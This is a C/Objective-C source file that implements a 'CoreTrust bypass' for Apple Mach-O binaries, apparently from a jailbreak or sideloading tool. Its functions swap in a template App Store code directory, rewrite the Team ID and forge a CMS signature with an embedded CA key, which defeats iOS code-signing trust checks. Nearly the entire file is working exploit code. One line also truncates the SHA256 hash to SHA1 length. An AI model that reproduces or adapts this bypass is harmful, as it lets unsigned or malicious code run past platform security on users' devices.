#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include "CSBlob.h"
#include "MachOByteOrder.h"
#include "MachO.h"
#include "Host.h"
#include "MemoryStream.h"
#include "FileStream.h"
#include "BufferedStream.h"
#include "CodeDirectory.h"
#include "Base64.h"
#include "Templates/AppStoreCodeDirectory.h"
#include "Templates/DERTemplate.h"
#include "Templates/TemplateSignatureBlob.h"
#include "Templates/CADetails.h"
#include <openssl/pem.h>
#include <openssl/err.h>
#include <copyfile.h>
#include <TargetConditionals.h>
#include <openssl/cms.h>

int update_signature_blob(CS_DecodedSuperBlob *superblob)
{
    CS_DecodedBlob *sha1CD = csd_superblob_find_blob(superblob, CSSLOT_CODEDIRECTORY, NULL);
    if (!sha1CD) {
        printf("Could not find SHA1 CodeDirectory blob!\n");
        return -1;
    }
    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!sha256CD) {
        printf("Could not find SHA256 CodeDirectory blob!\n");
        return -1;
    }

    uint8_t sha1CDHash[CC_SHA1_DIGEST_LENGTH];
    uint8_t sha256CDHash[CC_SHA256_DIGEST_LENGTH];

    {
        size_t dataSizeToRead = csd_blob_get_size(sha1CD);
        uint8_t *data = malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha1CD, 0, dataSizeToRead, data);
        CC_SHA1(data, (CC_LONG)dataSizeToRead, sha1CDHash);
        free(data);
        printf("SHA1 hash: ");
        for (int i = 0; i < CC_SHA1_DIGEST_LENGTH; i++) {
            printf("%02x", sha1CDHash[i]);
        }
        printf("\n");
    }

    {
        size_t dataSizeToRead = csd_blob_get_size(sha256CD);
        uint8_t *data = malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha256CD, 0, dataSizeToRead, data);
        CC_SHA256(data, (CC_LONG)dataSizeToRead, sha256CDHash);
        free(data);
        printf("SHA256 hash: ");
        for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
            printf("%02x", sha256CDHash[i]);
        }
        printf("\n");
    }

    const uint8_t *cmsDataPtr = AppStoreSignatureBlob + offsetof(CS_GenericBlob, data);
    size_t cmsDataSize = AppStoreSignatureBlob_len - sizeof(CS_GenericBlob);
    CMS_ContentInfo *cms = d2i_CMS_ContentInfo(NULL, (const unsigned char**)&cmsDataPtr, cmsDataSize);
    if (!cms) {
        printf("Failed to parse CMS blob: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    FILE* privateKeyFile = fmemopen(CAKey, CAKeyLength, "r");
    if (!privateKeyFile) {
        printf("Failed to open private key file!\n");
        return -1;
    }
    EVP_PKEY* privateKey = PEM_read_PrivateKey(privateKeyFile, NULL, NULL, NULL);
    fclose(privateKeyFile);
    if (!privateKey) {
        printf("Failed to read private key file!\n");
        return -1;
    }

    FILE* certificateFile = fmemopen(CACert, CACertLength, "r");
    if (!certificateFile) {
        printf("Failed to open certificate file!\n");
        return -1;
    }
    X509* certificate = PEM_read_X509(certificateFile, NULL, NULL, NULL);
    fclose(certificateFile);
    if (!certificate) {
        printf("Failed to read certificate file!\n");
        return -1;
    }

    CMS_SignerInfo* newSigner = CMS_add1_signer(cms, certificate, privateKey, EVP_sha256(), CMS_PARTIAL | CMS_REUSE_DIGEST | CMS_NOSMIMECAP);
    if (!newSigner) {
        printf("Failed to add signer: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    CFMutableArrayRef cdHashesArray = CFArrayCreateMutable(NULL, 2, &kCFTypeArrayCallBacks);
    if (!cdHashesArray) {
        printf("Failed to create CDHashes array!\n");
        return -1;
    }

    CFDataRef sha1CDHashData = CFDataCreate(NULL, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha1CDHashData) {
        printf("Failed to create CFData from SHA1 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha1CDHashData);
    CFRelease(sha1CDHashData);

    CFDataRef sha256CDHashData = CFDataCreate(NULL, sha256CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha256CDHashData) {
        printf("Failed to create CFData from SHA256 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha256CDHashData);
    CFRelease(sha256CDHashData);
    
    CFMutableDictionaryRef cdHashesDictionary = CFDictionaryCreateMutable(NULL, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!cdHashesDictionary) {
        printf("Failed to create CDHashes dictionary!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFDictionarySetValue(cdHashesDictionary, CFSTR("cdhashes"), cdHashesArray);
    CFRelease(cdHashesArray);

    CFErrorRef error = NULL;
    CFDataRef cdHashesDictionaryData = CFPropertyListCreateData(NULL, cdHashesDictionary, kCFPropertyListXMLFormat_v1_0, 0, &error);
    CFRelease(cdHashesDictionary);
    if (!cdHashesDictionaryData) {
        CFStringRef errorString = CFErrorCopyDescription(error);
        CFIndex maxSize = CFStringGetMaximumSizeForEncoding(CFStringGetLength(errorString), kCFStringEncodingUTF8) + 1;
        char *buffer = (char *)malloc(maxSize);
        if (CFStringGetCString(errorString, buffer, maxSize, kCFStringEncodingUTF8)) {
            printf("Failed to encode CDHashes plist: %s\n", buffer);
        } else {
            printf("Failed to encode CDHashes plist: unserializable error\n");
        }
        free(buffer);
        return -1;
    }

    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.1", V_ASN1_OCTET_STRING, CFDataGetBytePtr(cdHashesDictionaryData), CFDataGetLength(cdHashesDictionaryData))) {
        printf("Failed to add text CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    uint8_t cdHashesDER[78];
    memset(cdHashesDER, 0, sizeof(cdHashesDER));
    memcpy(cdHashesDER, CDHashesDERTemplate, sizeof(CDHashesDERTemplate));
    memcpy(cdHashesDER + CDHASHES_DER_SHA1_OFFSET, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    memcpy(cdHashesDER + CDHASHES_DER_SHA256_OFFSET, sha256CDHash, CC_SHA256_DIGEST_LENGTH);

    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.2", V_ASN1_SEQUENCE, cdHashesDER, sizeof(cdHashesDER))) {
        printf("Failed to add CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    if (!CMS_SignerInfo_sign(newSigner)) {
        printf("Failed to sign CMS structure: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    uint8_t *newCMSData = NULL;
    size_t newCMSDataSize = 0;
    {
        int len = i2d_CMS_ContentInfo(cms, &newCMSData);
        if (len < 0) {
            printf("Failed to encode CMS blob: %s!\n", ERR_error_string(ERR_get_error(), NULL));
            return -1;
        }
        newCMSDataSize = (size_t)len;
    }

    CS_GenericBlob *newCMSDataBlob = malloc(sizeof(CS_GenericBlob) + newCMSDataSize);
    newCMSDataBlob->magic = CSMAGIC_BLOBWRAPPER;
    newCMSDataBlob->length = sizeof(CS_GenericBlob) + newCMSDataSize;
    GENERIC_BLOB_APPLY_BYTE_ORDER(newCMSDataBlob, HOST_TO_BIG_APPLIER);
    memcpy(newCMSDataBlob->data, newCMSData, newCMSDataSize);
    free(newCMSData);

    CS_DecodedBlob *oldSignatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
    if (oldSignatureBlob) {
        csd_superblob_remove_blob(superblob, oldSignatureBlob);
        csd_blob_free(oldSignatureBlob);
    }

    CS_DecodedBlob *signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, newCMSDataBlob);
    free(newCMSDataBlob);

    return csd_superblob_append_blob(superblob, signatureBlob);
}

static int apply_coretrust_bypass_internal(const char *machoPath, const char *teamIDOverride)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;

    if (macho_is_encrypted(macho)) {
        printf("Error: MachO is encrypted, please use a decrypted app!\n");
        macho_free(macho);
        return 2;
    }

    if (macho->machHeader.filetype == MH_OBJECT) {
        printf("Error: MachO is an object file, please use a MachO executable or dynamic library!\n");
        macho_free(macho);
        return 3;
    }

    if (macho->machHeader.filetype == MH_DSYM) {
        printf("Error: MachO is a dSYM file, please use a MachO executable or dynamic library!\n");
        macho_free(macho);
        return 3;
    }
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        macho_free(macho);
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirBlob = NULL;
    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    CS_DecodedBlob *entitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
    CS_DecodedBlob *derEntitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS, NULL);

    if (!entitlementsBlob && !derEntitlementsBlob && macho->machHeader.filetype == MH_EXECUTE) {
        printf("Warning: Unable to find existing entitlements blobs in executable MachO.\n");
    }

    if (!mainCodeDirBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed.\n");
        csd_superblob_free(decodedSuperblob);
        macho_free(macho);
        return -1;
    }

    if (alternateCodeDirBlob) {
        realCodeDirBlob = alternateCodeDirBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
        csd_blob_free(mainCodeDirBlob);
    }
    else {
        realCodeDirBlob = mainCodeDirBlob;
    }

    if (csd_code_directory_get_hash_type(realCodeDirBlob) != CS_HASHTYPE_SHA256_256) {
        printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
        csd_superblob_free(decodedSuperblob);
        macho_free(macho);
        return -1;
    }

    printf("Applying App Store code directory...\n");

    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);

    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    printf("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }


    printf("Updating TeamID...\n");

    char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore Team ID\n");
        csd_superblob_free(decodedSuperblob);
        macho_free(macho);
        return -1;
    }

    const char *targetTeamID = teamIDOverride ? teamIDOverride : appStoreTeamID;

    if (csd_code_directory_set_team_id(realCodeDirBlob, (char *)targetTeamID) != 0) {
        printf("Error: Failed to set Team ID\n");
        free(appStoreTeamID);
        csd_superblob_free(decodedSuperblob);
        macho_free(macho);
        return -1;
    }

    printf("TeamID set to %s!\n", targetTeamID);
    free(appStoreTeamID);

    csd_code_directory_set_flags(realCodeDirBlob, 0);

    int ret = 0;

    printf("Doing initial signing to calculate size...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        csd_superblob_free(decodedSuperblob);
        macho_free(macho);
        return -1;
    }

    printf("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize) != 0) {
        printf("Error: failed to update load commands!\n");
        free(encodedSuperblobUnsigned);
        csd_superblob_free(decodedSuperblob);
        macho_free(macho);
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    csd_code_directory_update(realCodeDirBlob, macho);

    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        csd_superblob_free(decodedSuperblob);
        macho_free(macho);
        return -1;
    }

    printf("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    printf("Writing superblob to MachO...\n");
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}

int apply_coretrust_bypass(const char *machoPath)
{
    return apply_coretrust_bypass_internal(machoPath, NULL);
}

int apply_coretrust_bypass_with_team_id(const char *machoPath, const char *teamID)
{
    return apply_coretrust_bypass_internal(machoPath, teamID);
}
